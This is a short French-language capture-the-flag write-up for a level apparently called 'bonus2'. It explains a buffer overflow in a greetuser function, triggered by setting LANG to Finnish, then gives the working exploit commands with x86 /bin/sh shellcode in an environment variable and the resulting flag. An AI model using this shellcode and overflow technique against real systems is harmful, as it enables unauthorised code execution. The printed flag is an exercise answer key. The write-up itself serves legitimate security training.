## GET Flag

Ici, la faille reside dans le fait que la fonction greetuser effectue la concatenation d'un buffer de 72 caractères dans un buffer de 72 caractères qui n'est pas vide (en l'occurence il contient une salutation).

Cependant, bien qu'il soit possible d'écrire sur la source de l'EIP avec cette méthode, les 6 caractères de "Hello " ne permettent pas d'aller suffisament loin dans la stack. Il n'est ainsi possible d'écrire que sur les 2 derniers octets de l'EIP.

Par ailleurs, en finlandais, la salutation n'est pas "Hello", mais "Hyvää päivää" soit 19 octets (unicode) au lieu de 7. Il est donc possible d'écrire sur l'EIP en changeant la variable d'environnement `LANG`. Cette nouvelle EIP sera celle d'un shellcode stocké au préalable dans l'environnement.

```
export LANG=fi
export SHELLCODE=$(python -c 'print 100*"\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
./bonus2 $(python -c 'print 40*"A"') $(python -c 'print 18*"B" + "\xad\xf8\xff\xbf"')
```

### Flag

```
bonus3
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
